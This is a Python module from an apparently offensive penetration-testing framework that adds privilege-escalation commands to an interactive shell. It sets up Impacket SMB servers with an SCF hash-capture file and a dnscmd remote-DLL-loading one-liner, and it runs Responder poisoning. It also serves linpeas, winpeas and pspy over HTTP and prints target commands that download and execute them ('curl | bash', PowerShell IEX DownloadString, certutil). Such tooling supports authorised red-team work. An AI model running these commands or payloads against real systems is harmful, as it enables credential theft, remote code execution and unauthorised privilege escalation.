"""Privilege Escalation command set.

Pending phase module covering local privilege escalation helpers:
SMB relay setup, Responder, linpeas / winpeas / pspy serving, kernel
exploit suggestion (LES), SUID enumeration, GTFOBins / LOLBas lookup and
the ``sudo`` re-launch helper.

Pending status: this set inherits from
:class:`cli.commands._dormancy.PendingCommandSet`, so it is discovered for
test coverage but not registered onto the shell while ``LazyOwnShell``
still defines the original methods. Promote it to
:class:`cli.commands._base.LazyOwnCommandSet` once the legacy copies are
deleted from ``lazyown.py``.
"""

from __future__ import annotations

import json
import os
import shutil

import cmd2

from cli.commands._dormancy import PendingCommandSet
from utils import (
    GREEN,
    WHITE,
    check_lhost,
    check_sudo,
    copy2clip,
    is_binary_present,
    print_error,
    print_msg,
    print_warn,
    privilege_escalation_category,
)

SESSIONS_DIRECTORY_NAME = "sessions"
SCF_FILE_NAME = "file.scf"
DEFAULT_SMB_FOLDER = "smbfolder"
DEFAULT_HTTP_LPORT = 1337
EXECUTABLE_FILE_MODE = 0o755

SMB_CHOICE_SCF = "1"
SMB_CHOICE_DNSCMD = "2"
SMB_CHOICE_GUEST_AUTH = "3"
SMB_DEFAULT_CHOICE = SMB_CHOICE_DNSCMD

RESPONDER_INSTALL_COMMAND = "sudo apt install responder python-aioquic -y"

LINPEAS_FILE_NAME = "linpeas.sh"
LINPEAS_SMALL_FILE_NAME = "linpeas_small.sh"
LINPEAS_SMALL_FLAG = "small"
LINPEAS_CANDIDATES = (
    "/usr/share/peass/linpeas/{name}",
    "external/.exploit/privilege-escalation-awesome-scripts-suite/linPEAS/{name}",
    "external/{name}",
)
LINPEAS_INSTALL_HINT = "Install with: sudo apt install peass"

WINPEAS_VARIANTS = {
    "x86": "winPEASx86.exe",
    "bat": "winPEAS.bat",
    "ps1": "winPEAS.ps1",
    "any": "winPEASany.exe",
}
WINPEAS_DEFAULT = "winPEASx64.exe"
WINPEAS_SHARE_DIR = "/usr/share/peass/winpeas"
WINPEAS_INSTALL_HINT = "Install: sudo apt install peass"

LES_CANDIDATES = (
    "external/.exploit/linux-exploit-suggester/linux-exploit-suggester.sh",
    "/usr/share/les/linux-exploit-suggester.sh",
)
LES_INSTALL_HINT = (
    "Install: git clone https://github.com/mzet-/linux-exploit-suggester external/.exploit/linux-exploit-suggester"
)
OS_JSON_FILENAME = "os.json"
OS_KERNEL_KEYS = ("kernel", "uname")

PSPY_DEFAULT_ARCH = "64"
PSPY_ALTERNATE_ARCH = "32"
PSPY_CANDIDATES = (
    "external/.exploit/pspy/{name}",
    "/usr/local/bin/{name}",
    "/opt/{name}",
)
PSPY_INSTALL_HINT = "Download from: https://github.com/DominicBreuker/pspy/releases"

GTFO_PARQUETS_DIRECTORY = "parquets"
GTFO_GTFOBINS_FILE = "detalles.parquet"
GTFO_LOLBAS_FILE = "lolbas_details.parquet"
GTFO_BINARY_COLUMN = "Binary"
GTFO_DESCRIPTION_PREVIEW = 80
GTFO_EXAMPLE_PREVIEW = 120
GTFO_PANDAS_HINT = "pandas required for gtfo: pip install pandas pyarrow"
GTFO_ONLINE_REFERENCE = "Check online: https://gtfobins.github.io/"


def _sessions_directory(base_path: str) -> str:
    """Return the absolute path to the per-shell ``sessions/`` directory.

    Args:
        base_path: Shell ``self.path`` (the repository working directory).

    Returns:
        Absolute path of ``<base_path>/sessions``.
    """
    return os.path.join(base_path, SESSIONS_DIRECTORY_NAME)


def _serve_via_http(shell, binary_name: str, sessions_path: str, lport: int) -> None:
    """Spawn a background HTTP server rooted at ``sessions_path``.

    Args:
        shell: The bound shell exposing ``cmd``.
        binary_name: Filename being announced. Used only for log clarity.
        sessions_path: Directory served by the HTTP server.
        lport: Listening port copied from ``payload.json``.
    """
    del binary_name
    shell.cmd(f"python3 -m http.server {lport} --directory {sessions_path} &")


class PrivilegeEscalationCommandSet(PendingCommandSet):
    """Pending phase module for the Privilege Escalation commands."""

    phase = "privesc"
    category = privilege_escalation_category

    @cmd2.with_category(privilege_escalation_category)
    def do_smbserver(self, line):
        """Stand up an Impacket SMB server with three relay variants.

        Variant 1 generates an SCF file under ``sessions/file.scf`` that
        triggers SMB auth from victims browsing the share. Variant 2
        copies a ``dnscmd`` DLL load one-liner for DA pivoting. Variant 3
        publishes the share with ``guest`` credentials for blind file
        drops.

        Args:
            line: Optional share folder name. Defaults to
                :data:`DEFAULT_SMB_FOLDER`.

        Returns:
            None.
        """
        folder = line if line else DEFAULT_SMB_FOLDER
        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return
        prompt = (
            f"    [!] Enter your choice {GREEN}1) {WHITE}to file.scf attack, "
            f"{GREEN}2){WHITE} to dnscmd dll attack or "
            f"{GREEN}3) simple server with username (default: {SMB_DEFAULT_CHOICE})"
        )
        choice = input(prompt) or SMB_DEFAULT_CHOICE
        if choice == SMB_CHOICE_SCF:
            revshell = (
                f"[Shell]\nCommand=2\nIconFile=\\\\\\\\{lhost}\\{folder}\\icon.ico\n[Taskbar]\nCommand=ToggleDesktop\n"
            )
            scf_path = os.path.join(SESSIONS_DIRECTORY_NAME, SCF_FILE_NAME)
            print_msg(f"Try... echo '{revshell}' > {scf_path} ")
            self.cmd(f"echo '{revshell}' > {scf_path} ")
            print_msg(f"echo 'curl http://{lhost}/{SCF_FILE_NAME}' |  xclip -sel clip")
            print_msg("command copied to clipboard")
            print_msg(f"trying sudo impacket-smbserver {folder} $(pwd) -smb2support ...")
            self.cmd(f"echo 'curl http://{lhost}/{SCF_FILE_NAME} -o {SCF_FILE_NAME}' |  xclip -sel clip")
            self.cmd(f"cd {SESSIONS_DIRECTORY_NAME} && sudo impacket-smbserver {folder} $(pwd) -smb2support")
        elif choice == SMB_CHOICE_DNSCMD:
            command = f"cd {SESSIONS_DIRECTORY_NAME} && sudo impacket-smbserver {folder} $(pwd) -smb2support"
            print_msg(command)
            attack = f"cmd /c dnscmd localhost /config /serverlevelplugindll \\{lhost}\\{folder}\\da.dll"
            copy2clip(attack)
            self.cmd(command)
        elif choice == SMB_CHOICE_GUEST_AUTH:
            command = (
                f"cd {SESSIONS_DIRECTORY_NAME} && "
                f"sudo impacket-smbserver -username guest -password guest "
                f"{folder} $(pwd) -smb2support"
            )
            print_msg(command)
            attack = f"net use x: \\\\{lhost}\\{folder} /user:guest guest"
            copy2clip(attack)
            self.cmd(command)
        else:
            print_error("wrong choice (1/2)")

    @cmd2.with_category(privilege_escalation_category)
    def do_responder(self, line):
        """Run Responder on the configured ``device`` with elevated privileges.

        Installs the package via ``apt`` when the binary is missing, then
        invokes ``sudo responder -I <device> -w On`` so SMB/LLMNR/NBNS
        poisoning starts immediately.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        device = self.params["device"]
        if not device:
            print_error("Device must be assign use assign device <network_device_ex_tun0>")
            return
        if not is_binary_present("responder"):
            print_warn("Responder not found installing...")
            self.cmd(RESPONDER_INSTALL_COMMAND)
        print_msg(f"Try sudo responder -I {device} -w On ")
        self.cmd(f"sudo responder -I {device} -w On ")

    @cmd2.with_category(privilege_escalation_category)
    def do_sudo(self, line):
        """Re-launch the framework with root privileges when missing.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        check_sudo()

    @cmd2.with_category(privilege_escalation_category)
    def do_linpeas(self, line):
        """Serve ``linpeas.sh`` over HTTP and print the target one-liner.

        Searches the configured candidates for the script, copies it
        into ``sessions/`` and spawns a background HTTP server bound to
        ``lhost:lport`` so the compromised host can pull and execute it.

        Args:
            line: Optional ``small`` flag to switch to ``linpeas_small.sh``.

        Returns:
            None.
        """
        lhost = self.params.get("lhost") or ""
        lport = self.params.get("lport", DEFAULT_HTTP_LPORT)
        if not check_lhost(lhost):
            return
        small = LINPEAS_SMALL_FLAG in (line or "").lower()
        fname = LINPEAS_SMALL_FILE_NAME if small else LINPEAS_FILE_NAME
        candidates = [template.format(name=fname) for template in LINPEAS_CANDIDATES]
        source = next((p for p in candidates if os.path.isfile(p)), None)
        if not source:
            print_error(f"{fname} not found. {LINPEAS_INSTALL_HINT}")
            return
        sessions_path = _sessions_directory(self.path)
        destination = os.path.join(sessions_path, fname)
        if not os.path.exists(destination):
            os.makedirs(sessions_path, exist_ok=True)
            shutil.copy2(source, destination)
        print_msg(f"Serving {fname} from sessions/ on http://{lhost}:{lport}")
        print_msg("Run on target (Linux):")
        print_msg(f"  curl -s http://{lhost}:{lport}/{fname} | bash")
        print_msg(f"  wget -qO- http://{lhost}:{lport}/{fname} | bash")
        _serve_via_http(self, fname, sessions_path, lport)

    @cmd2.with_category(privilege_escalation_category)
    def do_winpeas(self, line):
        """Serve a winPEAS variant over HTTP and print the target one-liner.

        Selects the variant by argument: default x64, ``x86`` for 32-bit,
        ``bat`` for the batch script (no AV evasion), ``ps1`` for the
        PowerShell port, or ``any`` for the merged binary.

        Args:
            line: Variant selector. Empty defaults to :data:`WINPEAS_DEFAULT`.

        Returns:
            None.
        """
        lhost = self.params.get("lhost") or ""
        lport = self.params.get("lport", DEFAULT_HTTP_LPORT)
        if not check_lhost(lhost):
            return
        argument = (line or "").lower().strip()
        fname = WINPEAS_VARIANTS.get(argument, WINPEAS_DEFAULT)
        source = os.path.join(WINPEAS_SHARE_DIR, fname)
        if not os.path.isfile(source):
            print_error(f"{fname} not found at {source}. {WINPEAS_INSTALL_HINT}")
            return
        sessions_path = _sessions_directory(self.path)
        destination = os.path.join(sessions_path, fname)
        if not os.path.exists(destination):
            shutil.copy2(source, destination)
        print_msg(f"Serving {fname} via http://{lhost}:{lport}")
        if fname.endswith(".ps1") or fname.endswith(".bat"):
            print_msg("Run on target (PowerShell):")
            print_msg(f'  IEX(New-Object Net.WebClient).DownloadString("http://{lhost}:{lport}/{fname}")')
        else:
            print_msg("Run on target (PowerShell):")
            print_msg(
                f'  certutil -urlcache -split -f "http://{lhost}:{lport}/{fname}" %TEMP%\\wp.exe && %TEMP%\\wp.exe'
            )
        _serve_via_http(self, fname, sessions_path, lport)

    @cmd2.with_category(privilege_escalation_category)
    def do_les(self, line):
        """Run Linux Exploit Suggester against a kernel version.

        When no version is supplied, attempts to read it from
        ``sessions/os.json``. Falls back to a warning when the kernel
        cannot be determined.

        Args:
            line: Optional explicit kernel version (``uname -r`` output).

        Returns:
            None.
        """
        kernel = (line or "").strip()
        if not kernel:
            os_data: dict = {}
            os_json_path = os.path.join(_sessions_directory(self.path), OS_JSON_FILENAME)
            if os.path.isfile(os_json_path):
                try:
                    with open(os_json_path, encoding="utf-8") as handle:
                        os_data = json.load(handle)
                except (OSError, json.JSONDecodeError):
                    os_data = {}
            for key in OS_KERNEL_KEYS:
                value = os_data.get(key)
                if value:
                    kernel = value
                    break
        if not kernel:
            print_warn("Kernel version unknown. Run 'uname -r' on the target and pass it: les <kernel>")
            return
        les_script = next((p for p in LES_CANDIDATES if os.path.isfile(p)), None)
        if not les_script:
            print_error("linux-exploit-suggester not found.")
            print_msg(LES_INSTALL_HINT)
            return
        print_msg(f"Running linux-exploit-suggester for kernel: {kernel}")
        self.cmd(f"bash {les_script} --uname '{kernel}'")

    @cmd2.with_category(privilege_escalation_category)
    def do_suid_check(self, line):
        """Print SUID/SGID enumeration commands ready to paste on the target.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        print_msg("Paste on target to find SUID/SGID binaries:")
        print_msg("  find / -perm -4000 -type f 2>/dev/null")
        print_msg("  find / -perm -2000 -type f 2>/dev/null")
        print_msg("  find / \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null")
        print_msg("")
        print_msg("Then look up each result: gtfo <binary>")
        print_msg("Or run linpeas for automated enumeration: linpeas")

    @cmd2.with_category(privilege_escalation_category)
    def do_pspy(self, line):
        """Serve the ``pspy`` process monitor over HTTP.

        Args:
            line: ``32`` to serve ``pspy32``; anything else serves
                ``pspy64``.

        Returns:
            None.
        """
        lhost = self.params.get("lhost") or ""
        lport = self.params.get("lport", DEFAULT_HTTP_LPORT)
        if not check_lhost(lhost):
            return
        arch = PSPY_ALTERNATE_ARCH if PSPY_ALTERNATE_ARCH in (line or "") else PSPY_DEFAULT_ARCH
        fname = f"pspy{arch}"
        candidates = [template.format(name=fname) for template in PSPY_CANDIDATES]
        source = next((p for p in candidates if os.path.isfile(p)), None)
        if not source:
            print_error(f"{fname} not found.")
            print_msg(PSPY_INSTALL_HINT)
            print_msg(f"Then place at: external/.exploit/pspy/{fname}")
            return
        sessions_path = _sessions_directory(self.path)
        destination = os.path.join(sessions_path, fname)
        if not os.path.exists(destination):
            shutil.copy2(source, destination)
            os.chmod(destination, EXECUTABLE_FILE_MODE)
        print_msg(f"Serving {fname} via http://{lhost}:{lport}")
        print_msg("Run on target:")
        print_msg(f"  wget http://{lhost}:{lport}/{fname} -O /tmp/{fname} && chmod +x /tmp/{fname} && /tmp/{fname}")
        _serve_via_http(self, fname, sessions_path, lport)

    @cmd2.with_category(privilege_escalation_category)
    def do_gtfo(self, line):
        """Look up a binary in GTFOBins and LOLBas parquet knowledge bases.

        Args:
            line: Binary name to search (case-insensitive). Empty input
                emits a usage error.

        Returns:
            None.
        """
        binary = (line or "").strip().lower()
        if not binary:
            print_error("Usage: gtfo <binary>  e.g. gtfo sudo")
            return
        try:
            import pandas
        except ImportError:
            print_error(GTFO_PANDAS_HINT)
            return
        parquets_path = os.path.join(self.path, GTFO_PARQUETS_DIRECTORY)
        sources = (
            ("GTFOBins", os.path.join(parquets_path, GTFO_GTFOBINS_FILE)),
            ("LOLBas", os.path.join(parquets_path, GTFO_LOLBAS_FILE)),
        )
        found = False
        for label, parquet_path in sources:
            if not os.path.isfile(parquet_path):
                continue
            frame = pandas.read_parquet(parquet_path)
            mask = frame[GTFO_BINARY_COLUMN].str.lower() == binary
            hits = frame[mask]
            if hits.empty:
                continue
            found = True
            print_msg(f"{label} - {binary}")
            for _, row in hits.iterrows():
                function_name = row.get("Function Name", "")
                description = str(row.get("Description", ""))[:GTFO_DESCRIPTION_PREVIEW]
                print_msg(f"  [{function_name}] {description}")
                example = str(row.get("Example", "")).strip()
                if example and example != "nan":
                    print_msg(f"    {example[:GTFO_EXAMPLE_PREVIEW]}")
        if not found:
            print_warn(f"'{binary}' not found in GTFOBins or LOLBas.")
            print_msg(GTFO_ONLINE_REFERENCE)


__all__ = ["PrivilegeEscalationCommandSet"]
